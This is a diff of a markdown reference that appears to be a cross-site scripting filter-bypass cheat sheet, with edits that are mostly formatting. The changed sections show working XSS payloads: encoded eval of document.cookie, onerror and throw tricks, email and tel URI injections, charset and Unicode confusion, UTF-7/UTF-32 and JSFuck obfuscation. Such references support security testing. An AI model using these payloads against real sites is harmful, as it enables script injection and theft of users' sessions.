@@ -17,7 +17,7 @@
 - [Bypass Email Filter](#bypass-email-filter)
 - [Bypass Tel URI Filter](#bypass-tel-uri-filter)
 - [Bypass document Blacklist](#bypass-document-blacklist)
-- [Bypass document.cookie Blacklist](#bypass-document-cookie-blacklist)
+- [Bypass document.cookie Blacklist](#bypass-documentcookie-blacklist)
 - [Bypass using Javascript Inside a String](#bypass-using-javascript-inside-a-string)
 - [Bypass using an Alternate Way to Redirect](#bypass-using-an-alternate-way-to-redirect)
 - [Bypass using an Alternate Way to Execute an Alert](#bypass-using-an-alternate-way-to-execute-an-alert)
@@ -40,7 +40,6 @@
 - [Bypass using JSfuck](#bypass-using-jsfuck)
 - [References](#references)
 
-
 ## Bypass Case Sensitive
 
 To bypass a case-sensitive XSS filter, you can try mixing uppercase and lowercase letters within the tags or function names.
@@ -51,7 +50,6 @@ To bypass a case-sensitive XSS filter, you can try mixing uppercase and lowercas
 ```
 
 Since many XSS filters only recognize exact lowercase or uppercase patterns, this can sometimes evade detection by tricking simple case-sensitive filters.
-
 
 ## Bypass Tag Blacklist
 
@@ -112,7 +110,6 @@ You can bypass a single quote with &#39; in an on mousedown event handler
 ```
 
 Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
-http://www.geektools.com/cgi-bin/ipconv.cgi
 
 ```javascript
 <script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
@@ -129,32 +126,37 @@ setTimeout`alert\u0028document.domain\u0029`;
 
 ## Bypass Parenthesis and Semi Colon
 
-* From @garethheyes
+- From @garethheyes
+
     ```javascript
     <script>onerror=alert;throw 1337</script>
     <script>{onerror=alert}throw 1337</script>
     <script>throw onerror=alert,'some string',123,'haha'</script>
     ```
 
-* From @terjanq
+- From @terjanq
+
     ```js
     <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
     ```
 
-* From @cgvwzq
+- From @cgvwzq
+
     ```js
     <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
     ```
 
 ## Bypass onxxxx Blacklist
 
-* Use less known tag
+- Use less known tag
+
     ```html
     <object onafterscriptexecute=confirm(0)>
     <object onbeforescriptexecute=confirm(0)>
     ```
 
-* Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed
+- Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed
+
     ```html
     <img src='1' onerror\x00=alert(0) />
     <img src='1' onerror\x0b=alert(0) />
@@ -162,20 +164,22 @@ setTimeout`alert\u0028document.domain\u0029`;
     <img src='1' onerror\x0a=alert(0) />
     ```
 
-* Bypass onxxx= filter with a '/'
+- Bypass onxxx= filter with a '/'
+
     ```js
     <img src='1' onerror/=alert(0) />
     ```
 
-
 ## Bypass Space Filter
 
-* Bypass space filter with "/"
+- Bypass space filter with "/"
+
     ```javascript
     <img/src='1'/onerror=alert(0)>
     ```
 
-* Bypass space filter with `0x0c/^L` or `0x0d/^M` or `0x0a/^J` or `0x09/^I`
+- Bypass space filter with `0x0c/^L` or `0x0d/^M` or `0x0a/^J` or `0x09/^I`
+
   ```html
   <svgonload=alert(1)>
   ```
@@ -186,31 +190,30 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
-
 ## Bypass Email Filter
 
-* [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
+- [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
+
   ```javascript
   "><svg/onload=confirm(1)>"@x.y
   ```
 
-* [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)
+- [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)
+
   ```javascript
   xss@example.com(<img src='x' onerror='alert(document.location)'>)
   ```
-
 
 ## Bypass Tel URI Filter
 
 At least 2 RFC mention the `;phone-context=` descriptor:
 
-* [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)
-* [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)
+- [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)
+- [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)
 
 ```javascript
 +330011223344;phone-context=<script>alert(0)</script>
 ```
-
 
 ## Bypass Document Blacklist
 
@@ -391,12 +394,11 @@ Use Unicode characters `U+FF1C` and `U+FF1E`, refer to [Bypass using Unicode](#b
 'te' instanceof alert('instanceof') instanceof 'xt';
 ```
 
-
 ## Bypass using Missing Charset Header
 
 **Requirements**:
 
-* Server header missing `charset`: `Content-Type: text/html`
+- Server header missing `charset`: `Content-Type: text/html`
 
 ### ISO-2022-JP
 
@@ -409,21 +411,18 @@ ISO-2022-JP uses escape characters to switch between several character sets.
 | `\x1B $@` | JIS X 0208 1978 |
 | `\x1B $B` | JIS X 0208 1983 |
 
-
 Using the [code table](https://en.wikipedia.org/wiki/JIS_X_0201#Codepage_layout), we can find multiple characters that will be transformed when switching from **ASCII** to **JIS X 0201 1976**.
 
 | Hex  | ASCII | JIS X 0201 1976 |
 | ---- | --- | --- |
-| 0x5c | `\` | `¥` | 
+| 0x5c | `\` | `¥` |
 | 0x7e | `~` | `‾` |
 
-
-**Example**
+**Example**:
 
 Use `%1b(J` to force convert a `\'` (ascii) in to `¥'` (JIS X 0201 1976), unescaping the quote.
 
 Payload: `search=%1b(J&lang=en";alert(1)//`
-
 
 ## Bypass using HTML Encoding
 
@@ -456,7 +455,7 @@ javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!�
 ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
 ```
 
-More alphabets on http://aem1k.com/aurebesh.js/#
+More alphabets on [aem1k.com/aurebesh.js](http://aem1k.com/aurebesh.js/)
 
 ## Bypass using ECMAScript6
 
@@ -465,7 +464,6 @@ More alphabets on http://aem1k.com/aurebesh.js/#
 ```
 
 ## Bypass using Octal encoding
-
 
 ```javascript
 javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
@@ -489,7 +487,6 @@ It uses Unicode escape sequences to represent characters.
 | `\u0072` | r         |
 | `\u0074` | t         |
 
-
 Same thing with these Unicode characters.
 
 | Unicode (UTF-8 encoded) | Unicode Name                 | ASCII | ASCII Name     |
@@ -499,13 +496,11 @@ Same thing with these Unicode characters.
 | `\u02BA` (%CA%BA)       | MODIFIER LETTER DOUBLE PRIME | "     | QUOTATION MARK |
 | `\u02B9` (%CA%B9)       | MODIFIER LETTER PRIME        | '     | APOSTROPHE     |
 
-
 An example payload could be `ʺ＞＜svg onload=alert(/XSS/)＞/`, which would look like that after being URL encoded:
 
 ```javascript
 %CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
 ```
-
 
 When Unicode characters are converted to another case, they might bypass a filter look for specific keywords.
 
@@ -522,7 +517,6 @@ The following payloads become valid HTML tags after being converted.
 <ſvg onload=... >
 <ıframe id=x onload=>
 ```
-
 
 ## Bypass using UTF-7
 
@@ -571,7 +565,6 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-
 ## Bypass using JSfuck
 
 Bypass using [jsfuck](http://www.jsfuck.com/)
@@ -579,7 +572,6 @@ Bypass using [jsfuck](http://www.jsfuck.com/)
 ```javascript
 [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
 ```
-
 
 ## References
 
